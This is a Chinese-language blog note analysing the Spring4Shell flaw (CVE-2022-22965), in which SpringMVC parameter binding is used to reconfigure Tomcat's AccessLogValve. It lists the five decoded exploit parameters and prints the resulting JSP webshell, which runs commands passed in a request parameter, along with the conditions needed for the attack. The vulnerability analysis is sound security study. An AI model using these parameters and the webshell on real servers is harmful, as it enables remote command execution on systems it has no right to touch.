---
title: Spring 远程命令执行漏洞（CVE-2022-22965）
date: 2022-5-8
tags:
 - Vulnerabilities
 - 笔记
categories:
 - Vulnerabilities
---

### 原理

springMVC支持嵌套参数绑定。假设请求参数名为`foo.bar.baz.qux`，对应`Controller`方法入参为`Param`，则有以下的调用链：

```Java
Param.getFoo()
    Foo.getBar()
        Bar.getBaz()
            Baz.setQux() // 注意这里为set
```

Tomcat的`Valve`用于处理请求和响应，通过组合了多个`Valve`的`Pipeline`，来实现按次序对请求和响应进行一系列的处理。其中`AccessLogValve`用来记录访问日志access_log。Tomcat的`server.xml`中默认配置了`AccessLogValve`，所有部署在Tomcat中的Web应用均会执行该`Valve`，内容如下：

```XML
<Valve className="org.apache.catalina.valves.AccessLogValve" directory="logs"
               prefix="localhost_access_log" suffix=".txt"
               pattern="%h %l %u %t &quot;%r&quot; %s %b" />
```

下面列出配置中出现的几个重要属性： - directory：access_log文件输出目录。 - prefix：access_log文件名前缀。 - pattern：access_log文件内容格式。 - suffix：access_log文件名后缀。 - fileDateFormat：access_log文件名日期后缀，默认为`.yyyy-MM-dd`。

### 漏洞分析

对POC进行解码后可以得到以下5对参数：

1. pattern参数

   - 参数名：`class.module.classLoader.resources.context.parent.pipeline.first.pattern`
   - 参数值：`%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i`

   这里利用的就是嵌套参数解析，最终得到完整的调用链为

   ```Java
   User.getClass()
       java.lang.Class.getModule()
           java.lang.Module.getClassLoader()
               org.apache.catalina.loader.ParallelWebappClassLoader.getResources()
                   org.apache.catalina.webresources.StandardRoot.getContext()
                       org.apache.catalina.core.StandardContext.getParent()
                           org.apache.catalina.core.StandardHost.getPipeline()
                               org.apache.catalina.core.StandardPipeline.getFirst()
                                   org.apache.catalina.valves.AccessLogValve.setPattern()
   ```

   可以看到，`pattern`参数最终对应`AccessLogValve.setPattern()`，即将`AccessLogValve`的`pattern`属性设置为`%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i`，也就是access_log的文件内容格式。

   最终可以得到`AccessLogValve`输出的日志实际内容如下（已格式化）：

   ```Java
   <%
   if("j".equals(request.getParameter("pwd"))){
       java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
       int a = -1;
       byte[] b = new byte[2048];
       while((a=in.read(b))!=-1){
           out.println(new String(b));
       }
   }
   %>
   ```

   很明显，这是一个JSP webshell。这个webshell输出到了哪儿？名称是什么？能被直接访问和正常解析执行吗？我们接下来看其余的参数。

2. suffix参数

   - 参数名：`class.module.classLoader.resources.context.parent.pipeline.first.suffix`
   - 参数值：`.jsp``

   `suffix`参数最终将`AccessLogValve.suffix`设置为`.jsp`，即access_log的文件名后缀。

3. directory参数

   - 参数名：`class.module.classLoader.resources.context.parent.pipeline.first.directory`
   - 参数值：`webapps/ROOT`

   `directory`参数最终将`AccessLogValve.directory`设置为`webapps/ROOT`，即access_log的文件输出目录。`webapps/ROOT`目录是Tomcat Web应用根目录。部署到目录下的Web应用，可以直接通过`http://localhost:8080/`根目录访问。

4. prefix参数

   - 参数名：`class.module.classLoader.resources.context.parent.pipeline.first.prefix`
   - 参数值：`tomcatwar`

   `prefix`参数最终将`AccessLogValve.prefix`设置为`tomcatwar`，即access_log的文件名前缀

5. fileDateFormat参数

   * 参数名：`class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat`
   * 参数值：空

   `fileDateFormat`参数最终将`AccessLogValve.fileDateFormat`设置为空，即access_log的文件名不包含日期。

### 总结

通过请求传入的参数，利用SpringMVC参数绑定机制，控制了Tomcat AccessLogValve的属性，让Tomcat在webapps/ROOT目录下输出定制的“访问日志” tomcatwar.jsp，该访问日志实际上为一个jsp webshell。

### 关键点

#### 1. web应用以war包部署

从java.lang.Module到org.apache.catalina.loader.ParallelWebappClassLoader是将调用链转移到tomcat，并最终利用AccessLogValve输出webshell的关键。而ParallelWebappClassLoader在Web应用以war包部署到Tomcat中时使用到。

如果是以jar包的形式运行web应用，classLoader嵌套参数会被解析为`org.springframework.boot.loader.LaunchedURLClassLoader`，而LaunchedURLClassLoader中并没有getResources方法，调用链也就断掉了。

#### 2. jdk版本 >= 1.9

在`AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);`调用的过程中，Spring做了一道防御：Spring使用`org.springframework.beans.CachedIntrospectionResults`缓存并返回Java Bean中可以被`BeanWrapperImpl`使用的`PropertyDescriptor`。在`CachedIntrospectionResults`第289行构造方法中

![image-20220730224959264](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220730224959.png)
当Bean的类型为`java.lang.Class`时，不返回`classLoader`和`protectionDomain`的`PropertyDescriptor`。Spring在构建嵌套参数的调用链时，会根据`CachedIntrospectionResults`缓存的`PropertyDescriptor`进行构建：

![image-20220730225039250](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220730225039.png)

不返回，也就意味着`class.classLoader...`这种嵌套参数走不通，即形如下方的调用链：

```Java
Foo.getClass()
    java.lang.Class.getClassLoader()
        BarClassLoader.getBaz()
            ......
```

这在JDK<=1.8都是有效的。但是在JDK 1.9之后，Java为了支持模块化，在`java.lang.Class`中增加了`module`属性和对应的`getModule()`方法，自然就能通过如下调用链绕过判断：

```Java
Foo.getClass()
    java.lang.Class.getModule() // 绕过
        java.lang.Module.getClassLoader()
            BarClassLoader.getBaz()
                ......
```

这就是为什么本漏洞利用条件之二，jdk>=1.9。

### 参考

[Spring 远程命令执行漏洞（CVE-2022-22965）原理分析和思考](https://paper.seebug.org/1877/)